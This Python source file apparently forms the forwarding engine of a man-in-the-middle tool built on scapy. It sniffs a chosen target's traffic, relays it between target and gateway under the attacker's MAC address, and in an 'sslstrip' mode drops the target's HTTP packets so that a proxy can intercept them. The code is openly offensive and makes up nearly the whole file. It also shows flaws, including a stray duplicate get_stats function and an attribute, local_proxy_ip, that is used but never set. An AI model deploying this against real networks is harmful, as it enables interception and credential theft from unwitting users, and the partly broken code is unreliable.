import logging
from scapy.layers.l2 import Ether, ARP, getmacbyip
from scapy.layers.inet import IP, TCP, UDP
from scapy.all import *
import threading


def get_stats(self):
    """Get packet statistics"""
    return {
        'forwarded': self.packets_forwarded,
        'dropped': self.packets_dropped,
        'running': self.running
    }


logger = logging.getLogger('PacketHandler')


class PacketHandler:
    """fml"""

    def __init__(self, interface, gateway_ip, target_ip=None):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.target_ip = target_ip

        # Operating mode i thought... idk window shouldnt matter what if we just dont send packets thru while we are stripping yfm but dditn work
        self.mode = "normal"

        # Get our MAC address
        self.attacker_mac = get_if_hwaddr(interface)

        # Resolve MAC addresses
        self.gateway_mac = self._resolve_mac(gateway_ip)
        self.target_mac = self._resolve_mac(target_ip) if target_ip else None

        self.filters = []  # List of (priority, function) tuples
        self.running = False
        self.sniffer_thread = None

        # Statistics
        self.packets_forwarded = 0
        self.packets_dropped = 0

        logger.info(f"PacketHandler initialized")
        logger.info(f"Interface: {interface}")
        logger.info(f"Our MAC: {self.attacker_mac}")
        logger.info(f"Gateway: {gateway_ip} ({self.gateway_mac})")
        logger.info(f"Target: {target_ip} ({self.target_mac})")

    def _resolve_mac(self, ip):
        """Resolve MAC address for an IP"""
        if not ip:
            return None

        try:
            # Try getmacbyip first
            mac = getmacbyip(ip)
            if mac and mac != "ff:ff:ff:ff:ff:ff":
                return mac

            # Manual ARP request
            arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            resp, _ = srp(arp_req, iface=self.interface,
                          timeout=2, retry=2, verbose=0)
            for _, pkt in resp:
                return pkt[Ether].src

        except Exception as e:
            logger.error(f"Could not resolve MAC for {ip}: {e}")

        return None

    def add_filter(self, filter_func, priority=0):
        """Add a packet filter with priority (higher = processed first)"""
        self.filters.append((priority, filter_func))
        self.filters.sort(key=lambda x: x[0], reverse=True)
        logger.info(f"Added filter with priority {priority}")
        return len(self.filters) - 1

    def remove_filter(self, filter_index):
        """Remove a filter by its index"""
        if 0 <= filter_index < len(self.filters):
            self.filters.pop(filter_index)
            return True
        return False

    def _packet_callback(self, packet):
        """Process each sniffed packet"""
        try:
            # Skip packets without IP layer
            if not packet.haslayer(IP):
                return

            # Skip our own packets to prevent loops
            if packet.haslayer(Ether) and packet[Ether].src == self.attacker_mac:
                return

            # Let filters process the packet first
            packet_blocked = False
            for priority, filter_func in self.filters:
                try:
                    if filter_func(packet):  # Filter handled/blocked the packet
                        packet_blocked = True
                        logger.debug(
                            f"Packet blocked by filter (priority {priority})")
                        break
                except Exception as e:
                    logger.error(f"Filter error: {e}")

            # Only forward if no filter blocked it
            if not packet_blocked:
                self._forward_packet(packet)
            else:
                self.packets_dropped += 1

        except Exception as e:
            logger.error(f"Packet callback error: {e}")

    def _forward_packet(self, packet):
        """Forward packets between target and gateway"""
        try:
            if not packet.haslayer(Ether):
                return

            src_ip = packet[IP].src
            dst_ip = packet[IP].dst

            # Check if we should drop HTTP packets (SSL strip mode)
            if self.mode == "sslstrip" and packet.haslayer(TCP):
                tcp = packet[TCP]

                # Drop HTTP packets - proxy will handle them
                if tcp.dport == 80 and dst_ip != self.local_proxy_ip:

                    # Only drop if it involves our target
                    if src_ip == self.target_ip or dst_ip == self.target_ip:
                        self.packets_dropped += 1
                        logger.debug(
                            f"Dropped HTTP packet (proxy mode): {src_ip}:{tcp.sport} → {dst_ip}:{tcp.dport}")
                        return  # DONT FORWWARD

            # Make a copy to avoid modifying the original
            pkt = packet.copy()

            # Clear checksums - they'll be recalculated :/
            if pkt.haslayer(IP):
                del pkt[IP].chksum
                del pkt[IP].len
            if pkt.haslayer(TCP):
                del pkt[TCP].chksum
            if pkt.haslayer(UDP):
                del pkt[UDP].chksum

            # Determine forwarding direction and set MACs
            forwarded = False

            # Target -> Gateway
            if self.target_ip and src_ip == self.target_ip and dst_ip != self.gateway_ip:
                pkt[Ether].dst = self.gateway_mac
                pkt[Ether].src = self.attacker_mac
                forwarded = True

            # Gateway -> Target
            elif self.target_ip and src_ip != self.target_ip and dst_ip == self.target_ip:
                pkt[Ether].dst = self.target_mac
                pkt[Ether].src = self.attacker_mac
                forwarded = True

            # Target -> Gateway (direct)
            elif self.target_ip and src_ip == self.target_ip and dst_ip == self.gateway_ip:
                pkt[Ether].dst = self.gateway_mac
                pkt[Ether].src = self.attacker_mac
                forwarded = True

            # Gateway -> Target (direct)
            elif self.target_ip and src_ip == self.gateway_ip and dst_ip == self.target_ip:
                pkt[Ether].dst = self.target_mac
                pkt[Ether].src = self.attacker_mac
                forwarded = True

            if forwarded:
                # Send the packet
                sendp(pkt, verbose=0, iface=self.interface)
                self.packets_forwarded += 1

                # Log interesting packets
                if packet.haslayer(TCP):
                    if self.mode != "sslstrip" and (packet[TCP].dport == 80 or packet[TCP].sport == 80):
                        logger.debug(
                            f"HTTP: {src_ip}:{packet[TCP].sport} -> {dst_ip}:{packet[TCP].dport}")
                    elif packet[TCP].dport == 443 or packet[TCP].sport == 443:
                        logger.debug(
                            f"HTTPS: {src_ip}:{packet[TCP].sport} -> {dst_ip}:{packet[TCP].dport}")
            else:
                self.packets_dropped += 1

        except Exception as e:
            # Silently handle forwarding errors
            self.packets_dropped += 1

    def _sniffer_loop(self):
        """Main sniffer loop"""
        try:
            # Build filter to avoid our own packets
            filter_str = f"ip and ether src not {self.attacker_mac}"

            # Add target filter if specified
            if self.target_ip:
                filter_str += f" and (src host {self.target_ip} or dst host {self.target_ip})"

            logger.info(f"Starting packet sniffer with filter: {filter_str}")

            # Start sniffing
            sniff(
                iface=self.interface,
                prn=self._packet_callback,
                filter=filter_str,
                store=0,
                stop_filter=lambda p: not self.running
            )

        except Exception as e:
            logger.error(f"Sniffer error: {e}")
            self.running = False

    def start(self):
        """Start packet handling"""
        if self.running:
            return

        self.running = True
        self.packets_forwarded = 0
        self.packets_dropped = 0

        self.sniffer_thread = threading.Thread(
            target=self._sniffer_loop,
            name="PacketHandler-Sniffer"
        )
        self.sniffer_thread.daemon = True
        self.sniffer_thread.start()

        logger.info("Packet handler started")

    def stop(self):
        """Stop packet handling"""
        logger.info("Stopping packet handler...")
        self.running = False

        if self.sniffer_thread:
            self.sniffer_thread.join(timeout=3)

        logger.info(
            f"Packet handler stopped - Forwarded: {self.packets_forwarded}, Dropped: {self.packets_dropped}")

    def get_stats(self):
        """Get packet statistics"""
        return {
            'forwarded': self.packets_forwarded,
            'dropped': self.packets_dropped,
            'running': self.running
        }
